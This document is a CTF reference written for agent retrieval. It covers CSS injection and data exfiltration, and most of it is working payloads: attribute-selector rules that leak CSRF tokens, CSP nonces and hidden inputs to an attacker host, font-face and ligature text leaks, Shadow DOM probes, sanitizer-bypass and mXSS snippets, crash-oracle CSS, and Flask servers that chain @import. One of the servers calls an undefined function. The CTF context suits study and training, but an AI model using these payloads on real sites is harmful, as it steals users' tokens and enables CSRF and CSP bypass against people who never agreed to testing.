# CSS Injection and Exfiltration - CTF Reference

> **Document Purpose:** Actionable CSS injection and data exfiltration techniques for CTF challenges. Covers attribute selector exfiltration, font-face text node leaking, recursive @import chains, Shadow DOM leaking, sanitizer bypasses, and advanced selectors for autonomous agent retrieval.

---

## 1. CSS Injection Fundamentals

> **When to use this section:** You can inject CSS (via `<style>`, `style=` attribute, or `@import`) into a page viewed by an admin bot or victim, and need to exfiltrate sensitive data without JavaScript execution.

**Tags:** `css-injection, exfiltration, admin-bot, csp-bypass, fundamentals`

**Why CSS Injection Matters in CTFs:**
- Works under strict CSP that blocks all JavaScript (`script-src 'none'`)
- Only requires `style-src 'unsafe-inline'` or injection into an existing `<style>` block
- Can exfiltrate CSRF tokens, hidden input values, nonces, and attribute data character by character
- Often the intended solution when an admin bot visits a page but XSS is impossible

**Common Injection Points:**
- User-controlled CSS via theme/color customization features
- Injection into `<style>` blocks via unsanitized input
- `style=` attribute injection when HTML attributes are partially controlled
- `@import url()` in stylesheets that accept user-controlled URLs
- CSS custom properties (`--var`) in template contexts

---

## 2. CSS Attribute Selector Exfiltration

> **When to use this section:** A secret value is stored in an HTML attribute (e.g., `value=`, `data-token=`, `href=`) and you need to leak it character by character.

### 2.1 Basic Attribute Selector Technique

**Tags:** `css-injection, exfiltration, attribute-selector, csrf-token, hidden-input`

**Concept:** CSS attribute selectors can match partial attribute values. By testing each character position, you leak the value one character at a time via background URL requests to an attacker server.

**Selector Types:**
```css
/* Starts with */
input[value^="a"] { background: url(https://ATTACKER/?leak=a); }

/* Contains */
input[value*="secret"] { background: url(https://ATTACKER/?leak=contains-secret); }

/* Ends with */
input[value$="xyz"] { background: url(https://ATTACKER/?leak=ends-xyz); }

/* Exact match */
input[value="full_token_here"] { background: url(https://ATTACKER/?leak=exact); }
```

**Single-Character Leak Payload (Brute Force First Character):**
```css
input[name="csrf"][value^="0"] { background: url(https://ATTACKER/?c=0); }
input[name="csrf"][value^="1"] { background: url(https://ATTACKER/?c=1); }
input[name="csrf"][value^="2"] { background: url(https://ATTACKER/?c=2); }
/* ... continue for all hex characters ... */
input[name="csrf"][value^="a"] { background: url(https://ATTACKER/?c=a); }
input[name="csrf"][value^="b"] { background: url(https://ATTACKER/?c=b); }
/* ... through f for hex tokens ... */
```

**Multi-Character Progressive Leak:**
```css
/* After learning first char is 'a', leak second char */
input[name="csrf"][value^="a0"] { background: url(https://ATTACKER/?c=a0); }
input[name="csrf"][value^="a1"] { background: url(https://ATTACKER/?c=a1); }
input[name="csrf"][value^="a2"] { background: url(https://ATTACKER/?c=a2); }
/* ... */
```

### 2.2 Targeting Common Elements

**Tags:** `css-injection, exfiltration, hidden-input, meta-tag, data-attribute`

**Hidden CSRF Token:**
```css
input[type="hidden"][name="csrf_token"][value^="PREFIX"] {
    background: url(https://ATTACKER/?token=PREFIX);
}
```

**Meta Tag Content:**
```css
meta[name="csrf-token"][content^="PREFIX"] {
    display: block;  /* meta tags are display:none by default */
    background: url(https://ATTACKER/?meta=PREFIX);
}
```

**Anchor Href Leak:**
```css
a[href^="/admin/flag?token=a"] { background: url(https://ATTACKER/?t=a); }
```

**Data Attributes:**
```css
div[data-secret^="flag{"] { background: url(https://ATTACKER/?d=flag); }
```

---

## 3. @import Recursive Chain Exfiltration

> **When to use this section:** You need to exfiltrate multiple characters without submitting a new page load for each character. The `@import` chain technique allows sequential multi-character exfiltration in a single page visit.

**Tags:** `css-injection, exfiltration, import-chain, multi-character, recursive`

**Concept:** The attacker server dynamically generates CSS with `@import` pointing back to itself. Each response includes selectors for the next unknown character, and the server builds up the leaked value from incoming requests.

**Step 1: Initial Injection**
```html
<style>@import url(https://ATTACKER/start);</style>
```

**Step 2: Attacker Server Logic (Python Flask Example)**
```python
from flask import Flask, request, make_response
app = Flask(__name__)

leaked = ""

@app.route('/start')
def start():
    return generate_css("")

@app.route('/leak')
def leak():
    global leaked
    char = request.args.get('c', '')
    leaked += char
    print(f"[+] Leaked so far: {leaked}")
    return generate_css(leaked)

def generate_css(known_prefix):
    charset = "0123456789abcdef"  # adjust for target charset
    css = ""
    for c in charset:
        test = known_prefix + c
        css += f'input[name="token"][value^="{test}"]'
        css += ' { background: url(https://ATTACKER/leak?c=' + c + '); }\n'
    # Chain: import next round after browser processes selectors
    css += f'@import url(https://ATTACKER/leak?c=POLL);'
    return make_response(css, 200, {'Content-Type': 'text/css'})
```

**Step 3: Browser Behavior**
1. Browser loads `@import url(https://ATTACKER/start)`
2. Receives CSS with selectors for first character + another `@import`
3. Matching selector fires background request leaking first character
4. Browser processes next `@import`, server generates selectors for second character
5. Process repeats until full value is exfiltrated

**Important Notes:**
- Chrome limits `@import` depth (usually ~20-30 levels); use chained `@import` at the end of each CSS block
- Firefox handles `@import` chains differently; test both browsers
- The server must respond quickly to avoid browser timeout on the import chain
- Some CTFs rate-limit or have short admin bot timeouts, requiring efficient charsets

---

## 4. @font-face Unicode-Range Text Node Leaking

> **When to use this section:** The secret is in a text node (visible text content) rather than an attribute. Attribute selectors cannot target text nodes, but `@font-face` with `unicode-range` can.

**Tags:** `css-injection, exfiltration, font-face, unicode-range, text-node, ligature`

**Concept:** Define custom fonts for specific unicode ranges. When the browser renders text containing a character in that range, it fetches the font file from your server, revealing which characters are present.

**Basic Unicode-Range Leak:**
```css
@font-face {
    font-family: "leak-a";
    src: url(https://ATTACKER/?char=a);
    unicode-range: U+0061;  /* 'a' */
}
@font-face {
    font-family: "leak-b";
    src: url(https://ATTACKER/?char=b);
    unicode-range: U+0062;  /* 'b' */
}
/* ... one @font-face per character to detect ... */

/* Apply to the element containing the secret text */
#secret-display {
    font-family: "leak-a", "leak-b", /* ... */ sans-serif;
}
```

**Limitation:** This only reveals character presence, not position or order. For positional leaking, use the ligature technique.

### 4.1 CSS Font Ligature Side-Channel

**Tags:** `css-injection, exfiltration, ligature, font, text-node, positional`

**Concept:** Create a custom font where specific multi-character ligatures have exaggerated widths. Combine with scrollbar detection or container overflow to leak sequences.

**Custom Ligature Font Approach:**
1. Generate an SVG or WOFF font where the ligature "fl" has width 10000px
2. Apply font to the target element inside a narrow container
3. If the text contains "fl", the container overflows
4. Detect overflow via `::-webkit-scrollbar` pseudo-element with background URL

```css
@font-face {
    font-family: "ligature-probe";
    src: url(https://ATTACKER/font-fl.woff);
}

#secret-container {
    font-family: "ligature-probe";
    width: 20px;
    overflow-x: auto;
}

#secret-container::-webkit-scrollbar {
    background: url(https://ATTACKER/?has_ligature=fl);
}
```

---

## 5. Shadow DOM and :host-context() Leaking

> **When to use this section:** The target application uses Shadow DOM (Declarative or JavaScript) and secrets are in attributes of shadow host or parent elements.

**Tags:** `css-injection, exfiltration, shadow-dom, host-context, declarative-shadow-dom`

**:host-context() Selector:**
The `:host-context()` pseudo-class matches based on ancestors of the shadow host, allowing CSS inside a shadow tree to probe attributes of elements outside the shadow boundary.

```html
<!-- Target HTML structure -->
<div data-role="admin" data-token="secret123">
  <template shadowrootmode="open">
    <style>
      :host-context([data-token^="s"]) .probe {
        background: url(https://ATTACKER/?t=s);
      }
      :host-context([data-token^="se"]) .probe {
        background: url(https://ATTACKER/?t=se);
      }
    </style>
    <div class="probe">X</div>
  </template>
</div>
```

**Declarative Shadow DOM Injection:**
If the application uses Declarative Shadow DOM (`<template shadowrootmode="open">`), and you can inject HTML that becomes part of the shadow tree:
```html
<template shadowrootmode="open">
  <style>
    :host-context(input[value^="flag{"]) span { background: url(https://ATTACKER/?v=flag); }
  </style>
  <span>x</span>
</template>
```

**Limitations:**
- `:host-context()` is supported in Chromium but not Firefox
- Only works for attributes on ancestor elements, not text content
- Shadow DOM must be open (not closed) or you must inject within it

---

## 6. :has() Selector for Relational Targeting

> **When to use this section:** You need to style (and trigger exfiltration from) an element based on its descendants or siblings, enabling more complex targeting logic.

**Tags:** `css-injection, exfiltration, has-selector, relational, modern-css`

**Concept:** The `:has()` selector allows selecting a parent based on its children, enabling exfiltration based on the presence of specific child elements or attribute values.

**Basic :has() Exfiltration:**
```css
/* Leak if a form contains a hidden input with specific token prefix */
form:has(input[name="token"][value^="abc"]) {
    background: url(https://ATTACKER/?token_starts=abc);
}

/* Leak based on sibling content */
div:has(+ div[data-flag]) {
    background: url(https://ATTACKER/?has_flag_sibling=1);
}

/* Combined with attribute selectors for precise targeting */
body:has(meta[name="flag"][content^="CTF{"]) {
    background: url(https://ATTACKER/?flag_prefix=CTF);
}
```

**:has() + :not() Combination:**
```css
/* Detect absence of security headers reflected in page */
html:not(:has(meta[http-equiv="Content-Security-Policy"])) {
    background: url(https://ATTACKER/?no_csp_meta=1);
}
```

**Browser Support:** `:has()` is supported in Chrome 105+, Firefox 121+, Safari 15.4+. Most modern admin bots use recent Chrome/Chromium.

---

## 7. CSS Injection via Sanitizer Bypass

> **When to use this section:** The application uses a sanitizer (DOMPurify, Bleach, server-side HTML cleaner) and you need to get CSS injection through it.

**Tags:** `css-injection, sanitizer-bypass, dompurify, csp-bypass, filter-bypass`

### 7.1 DOMPurify CSS Bypass Techniques

**DOMPurify Default Behavior:**
- By default, DOMPurify strips `<style>` tags and `style` attributes
- If `ALLOW_STYLE` or `ADD_TAGS: ['style']` is configured, CSS injection is possible

**When Styles Are Allowed:**
```html
<!-- DOMPurify with FORCE_BODY + style allowed -->
<style>
input[value^="a"] { background: url(https://ATTACKER/?v=a); }
</style>
```

**Mutation XSS to CSS Injection:**
```html
<!-- Parser differential: some sanitizers don't handle these edge cases -->
<math><style><img src=x onerror=alert(1)></style></math>
<!-- In some parser contexts, <style> inside <math>/<svg> is treated as raw text -->
```

### 7.2 Style Attribute Injection

**Tags:** `css-injection, style-attribute, sanitizer-bypass, injection`

If `style=` attributes are allowed but `<style>` tags are stripped:
```html
<!-- Direct style injection for limited exfiltration -->
<div style="background: url(https://ATTACKER/?injected=1)">content</div>

<!-- Using CSS variables for more complex payloads -->
<div style="--x: url(https://ATTACKER/?leak=1); background: var(--x);">content</div>
```

### 7.3 Declarative Shadow DOM Bypass

**Tags:** `css-injection, shadow-dom, declarative, sanitizer-bypass`

Some sanitizers do not properly handle Declarative Shadow DOM templates, allowing style injection inside shadow roots:
```html
<div>
  <template shadowrootmode="open">
    <style>
      /* This CSS might survive sanitization if the sanitizer
         doesn't process template[shadowrootmode] contents */
      :host-context(input[value^="x"]) .x { background: url(https://ATTACKER/?v=x); }
    </style>
    <span class="x">probe</span>
  </template>
</div>
```

---

## 8. Chromium Crash Oracle Technique

> **When to use this section:** You need a boolean oracle (yes/no answer) based on whether certain CSS selectors match, and you can detect page crashes or hangs.

**Tags:** `css-injection, crash-oracle, chromium, boolean, side-channel`

**Concept:** Certain CSS constructs can cause Chromium to crash or consume extreme memory. By conditionally applying these constructs (using selectors that match only if a secret character is correct), you create a crash oracle: if the page crashes, the character guess was correct.

**Exponential Blowup via Nested Selectors:**
```css
/* This can cause extreme rendering time / memory if it matches */
input[value^="a"]:first-child:first-child:first-child:first-child
:first-child:first-child:first-child:first-child:first-child:first-child
:first-child:first-child:first-child:first-child:first-child:first-child {
    /* Apply heavy rendering */
    filter: blur(100px) blur(100px) blur(100px) blur(100px) blur(100px);
    transform: scale(10000);
}
```

**Practical Crash Oracle:**
```css
/* Use CSS variable recursion or deeply nested calc() */
input[value^="GUESS"] {
    --a: calc(var(--b) + 1px);
    --b: calc(var(--a) + 1px);
    width: var(--a);
}
```

**Detection:** If the admin bot's page load times out or crashes (detectable via error in the bot framework), the guess was correct.

**Limitations:**
- Browser-specific and version-dependent
- Not reliable across all CTF admin bot configurations
- Some CTFs specifically patch against crash-based oracles

---

## 9. Practical CSS Exfiltration Automation

> **When to use this section:** Setting up the complete exfiltration pipeline for a CTF challenge.

**Tags:** `css-injection, exfiltration, automation, server, pipeline`

**Complete Exfiltration Server (Python):**
```python
from flask import Flask, request, make_response
from flask_cors import CORS
import string

app = Flask(__name__)
CORS(app)

leaked_data = {}

@app.route('/css')
def serve_css():
    """Serve CSS with attribute selectors for next unknown character."""
    prefix = request.args.get('prefix', '')
    target_attr = request.args.get('attr', 'value')
    target_elem = request.args.get('elem', 'input[type=hidden]')
    charset = string.ascii_lowercase + string.digits + "_{}-"

    rules = []
    for c in charset:
        test_val = prefix + c
        rules.append(
            f'{target_elem}[{target_attr}^="{test_val}"] {{ '
            f'background: url(https://ATTACKER/leak?prefix={test_val}); }}'
        )

    css_content = "\n".join(rules)
    resp = make_response(css_content)
    resp.headers['Content-Type'] = 'text/css'
    return resp

@app.route('/leak')
def leak():
    """Receive leaked character and return CSS for next character."""
    prefix = request.args.get('prefix', '')
    leaked_data['current'] = prefix
    print(f"[+] Leaked: {prefix}")
    # Return CSS for next character (for @import chain)
    return serve_css_for_prefix(prefix)

@app.route('/status')
def status():
    """Check current leaked data."""
    return {'leaked': leaked_data.get('current', '')}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, ssl_context='adhoc')
```

**Injection Payload for Admin Bot:**
```html
<style>@import url(https://ATTACKER:8888/css?prefix=&attr=value&elem=input[name%3Dtoken]);</style>
```

---

## 10. Common CTF Patterns

> **When to use this section:** Solving CSS injection challenges in CTF competitions.

**Tags:** `css-injection, exfiltration, ctf, patterns, admin-bot`

**Pattern 1: CSRF Token Exfiltration Under Strict CSP**
```
Challenge: Strict CSP blocks all JS, but style-src allows inline styles
Setup: Admin bot visits attacker-controlled page that iframes the target
Goal: Leak the anti-CSRF token from a hidden input
Technique: Inject <style> with attribute selectors targeting input[name=csrf][value^=...]
Note: Requires style-src 'unsafe-inline' or injection into existing stylesheet
```

**Pattern 2: Nonce Exfiltration for CSP Bypass**
```
Challenge: CSP uses nonce-based script-src, nonce is in a <script nonce="..."> tag
Setup: CSS injection allowed, need to leak nonce to then inject valid <script>
Technique: Use attribute selector on script[nonce^="..."] to leak nonce value
Chain: CSS leak nonce -> inject <script nonce="LEAKED"> -> XSS
```

**Pattern 3: Flag in Data Attribute**
```
Challenge: Flag stored in data-flag attribute on a DOM element
Setup: Admin bot visits page with your CSS injection
Technique: div[data-flag^="flag{"] { background: url(...); }
```

**Pattern 4: Two-Stage CSS + Fetch**
```
Challenge: CSS injection + relaxed CSP allowing fetch
Setup: Leak token via CSS, then use it in a form submission
Technique: Stage 1 leaks via CSS, Stage 2 uses leaked value
```

**CTF Playbook:**
1. Identify what data needs to be exfiltrated (token, flag, nonce)
2. Determine where the data lives (attribute vs. text node)
3. For attributes: use CSS attribute selectors (`[attr^=...]`)
4. For text nodes: use `@font-face` unicode-range or ligature technique
5. Set up exfiltration server to receive and chain requests
6. For multi-character leaks: use `@import` recursive chain
7. Submit injection URL to admin bot and monitor server logs
8. If CSP blocks `url()` in CSS: check if `@import` from external origin is allowed

---

## 11. Agent Takeaway

> - Use `css_injection_payload` tool to generate attribute selector exfiltration payloads automatically
> - Use `css_exfiltration_builder` tool to set up @import chain payloads for multi-character leaks
> - CSS injection is the primary exfiltration technique when CSP blocks JavaScript entirely
> - Attribute selectors (`value^=`) are the workhorse for leaking hidden input values and tokens
> - `@import` recursive chains enable multi-character exfiltration in a single admin bot visit
> - `@font-face` unicode-range is required when the secret is in text content, not attributes
> - `:has()` selector enables parent-based targeting that was previously impossible with CSS alone
> - Always check the CSP: `style-src 'unsafe-inline'` is needed for inline CSS injection; `style-src *` or specific domain needed for `@import`
> - In admin-bot challenges, the bot's browser is usually Chromium, so `:host-context()` and `:has()` are available
